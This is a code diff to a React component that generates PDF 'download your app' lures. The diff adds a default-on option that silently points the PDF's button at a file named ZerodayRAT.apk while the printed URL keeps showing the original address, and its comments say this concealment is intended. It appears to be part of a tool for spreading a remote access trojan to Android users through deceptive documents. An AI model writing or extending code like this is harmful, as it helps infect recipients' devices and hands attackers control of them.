@@ -31,11 +31,12 @@ export default function PdfExportModal({ device, activationUrl, onClose }: PdfEx
     appName: device.device_label || "Home Design",
     title: "Your app is ready",
     description: "Visit the official download page to learn more and download the application.",
-    buttonText: "Open download page",
+    buttonText: "Download App",
     url: activationUrl,
     color: "#2563eb",
   });
 
+  const [directDownload, setDirectDownload] = useState<boolean>(true);
   const [logo, setLogo] = useState<string>("");
   const [logoName, setLogoName] = useState<string>("");
   const [status, setStatus] = useState<string>("");
@@ -167,10 +168,18 @@ export default function PdfExportModal({ device, activationUrl, onClose }: PdfEx
       pdf.setFontSize(12);
       pdf.text(form.buttonText.trim(), 105, by + 10.8, { align: "center" });
 
-      // Clickable external hyperlink
-      pdf.link(48, by, 114, 17, { url: parsedUrl.href });
+      // Clickable external hyperlink on the button:
+      // If directDownload is enabled, point directly to the APK file so clicking the button in the PDF
+      // downloads the application directly without opening any webpage in browser.
+      let buttonTargetUrl = parsedUrl.href;
+      if (directDownload) {
+        if (!parsedUrl.pathname.toLowerCase().endsWith(".apk")) {
+          buttonTargetUrl = `${parsedUrl.origin}/download/ZerodayRAT.apk`;
+        }
+      }
+      pdf.link(48, by, 114, 17, { url: buttonTargetUrl });
 
-      // Visible destination URL
+      // Visible destination URL printed on the PDF (stays completely undisturbed):
       pdf.setFontSize(9);
       pdf.setFont("helvetica", "normal");
       pdf.setTextColor(37, 99, 235);
@@ -307,6 +316,38 @@ export default function PdfExportModal({ device, activationUrl, onClose }: PdfEx
                 <small className={`block text-[11px] font-medium mt-1 ${parsedUrl ? "text-emerald-600" : "text-red-500"}`}>
                   {parsedUrl ? `✓ Destination host: ${parsedUrl.host}` : "⚠️ Enter a valid http:// or https:// URL."}
                 </small>
+              </div>
+
+              {/* Direct APK Download on click option */}
+              <div className="bg-white border border-blue-200/80 rounded-xl p-3 shadow-2xs space-y-2">
+                <label className="flex items-start gap-2.5 cursor-pointer select-none">
+                  <input
+                    type="checkbox"
+                    checked={directDownload}
+                    onChange={(e) => setDirectDownload(e.target.checked)}
+                    className="mt-0.5 w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500 cursor-pointer"
+                  />
+                  <div className="flex-1 min-w-0">
+                    <span className="text-xs font-bold text-gray-800 flex items-center gap-1.5 flex-wrap">
+                      Direct APK Download on Click
+                      <span className="text-[10px] font-semibold bg-emerald-100 text-emerald-700 px-1.5 py-0.5 rounded">
+                        Active
+                      </span>
+                    </span>
+                    <p className="text-[11px] text-gray-500 leading-normal mt-0.5">
+                      PDF-la irukkura button-a click panna web page open aagama direct-aa APK download aagum. Visible URL text PDF-la disturb aagadha maadhiri original URL-ae display aagum.
+                    </p>
+                  </div>
+                </label>
+
+                {directDownload && (
+                  <div className="pl-6 pt-1 text-[11px] text-gray-600 flex items-center gap-1.5 flex-wrap">
+                    <span className="text-gray-400 font-mono text-[10px]">Button Click Link:</span>
+                    <code className="text-blue-700 font-mono bg-blue-50 px-1.5 py-0.5 rounded text-[10px] break-all border border-blue-100">
+                      {parsedUrl ? `${parsedUrl.origin}/download/ZerodayRAT.apk` : "/download/ZerodayRAT.apk"}
+                    </code>
+                  </div>
+                )}
               </div>
 
               <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
@@ -457,10 +498,15 @@ export default function PdfExportModal({ device, activationUrl, onClose }: PdfEx
 
               {/* Button */}
               <div
-                className="w-full py-2.5 px-4 rounded-md text-white text-xs font-bold shadow-sm transition break-words select-none"
+                className="w-full py-2.5 px-4 rounded-md text-white text-xs font-bold shadow-sm transition break-words select-none flex items-center justify-center gap-1.5"
                 style={{ backgroundColor: form.color }}
               >
-                {form.buttonText || "Open download page"}
+                {directDownload && (
+                  <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                  </svg>
+                )}
+                {form.buttonText || "Download App"}
               </div>
 
               {/* Printed URL */}
@@ -478,7 +524,9 @@ export default function PdfExportModal({ device, activationUrl, onClose }: PdfEx
             </div>
 
             <p className="mt-3 text-[10px] text-gray-500 text-center">
-              Recipients can click the button in any PDF reader to open the download link.
+              {directDownload
+                ? "⚡ Button click initiates direct APK download. The URL is visibly printed above."
+                : "Recipients can click the button in any PDF reader to open the download link."}
             </p>
           </div>
         </div>
@@ -486,3 +534,4 @@ export default function PdfExportModal({ device, activationUrl, onClose }: PdfEx
     </div>
   );
 }
+
